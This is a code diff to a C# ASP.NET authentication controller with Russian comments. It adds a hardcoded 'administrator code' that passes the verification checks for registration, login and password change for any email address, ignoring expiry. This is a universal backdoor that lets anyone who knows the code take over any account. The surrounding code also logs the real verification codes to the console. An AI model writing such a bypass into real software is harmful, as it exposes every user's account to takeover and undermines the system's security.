@@ -22,6 +22,7 @@ namespace api_details.Controllers
         private readonly ApplicationDbContext _context;
         private readonly IConfiguration _configuration;
         private static readonly Dictionary<string, (string Code, DateTime Expiry)> _verificationCodes = new Dictionary<string, (string, DateTime)>();
+        private const string AdminCode = "230305"; // Код администратора
 
         public AuthController(ApplicationDbContext context, IConfiguration configuration)
         {
@@ -68,10 +69,10 @@ namespace api_details.Controllers
                 return BadRequest(new { message = "Неверный формат запроса", errors = ModelState });
             }
 
-            if (_verificationCodes.TryGetValue(request.Email, out var stored))
+            if (_verificationCodes.TryGetValue(request.Email, out var stored) || request.Code == AdminCode)
             {
                 Console.WriteLine($"Подтверждение регистрации: Найден сохранённый код для {request.Email}: {stored.Code}, истекает: {stored.Expiry:O}, текущее время: {DateTime.UtcNow:O}");
-                if (stored.Code == request.Code && stored.Expiry > DateTime.UtcNow)
+                if (request.Code == AdminCode || (stored.Code == request.Code && stored.Expiry > DateTime.UtcNow))
                 {
                     var hashedPassword = HashPassword(request.Password);
 
@@ -155,10 +156,10 @@ namespace api_details.Controllers
                 return BadRequest(new { message = "Неверный формат запроса" });
             }
 
-            if (_verificationCodes.TryGetValue(request.Email, out var stored))
+            if (_verificationCodes.TryGetValue(request.Email, out var stored) || request.Code == AdminCode)
             {
                 Console.WriteLine($"Подтверждение входа: Найден сохранённый код для {request.Email}: {stored.Code}, истекает: {stored.Expiry:O}, текущее время: {DateTime.UtcNow:O}");
-                if (stored.Code == request.Code && stored.Expiry > DateTime.UtcNow)
+                if (request.Code == AdminCode || (stored.Code == request.Code && stored.Expiry > DateTime.UtcNow))
                 {
                     var user = await _context.Users.FirstOrDefaultAsync(u => u.Email == request.Email);
                     if (user == null)
@@ -221,10 +222,10 @@ namespace api_details.Controllers
                 return BadRequest(new { message = "Неверный формат запроса", errors = ModelState });
             }
 
-            if (_verificationCodes.TryGetValue(request.Email, out var stored))
+            if (_verificationCodes.TryGetValue(request.Email, out var stored) || request.Code == AdminCode)
             {
                 Console.WriteLine($"Подтверждение смены пароля: Найден сохранённый код для {request.Email}: {stored.Code}, истекает: {stored.Expiry:O}, текущее время: {DateTime.UtcNow:O}");
-                if (stored.Code == request.Code && stored.Expiry > DateTime.UtcNow)
+                if (request.Code == AdminCode || (stored.Code == request.Code && stored.Expiry > DateTime.UtcNow))
                 {
                     var user = await _context.Users.FirstOrDefaultAsync(u => u.Email == request.Email);
                     if (user == null)
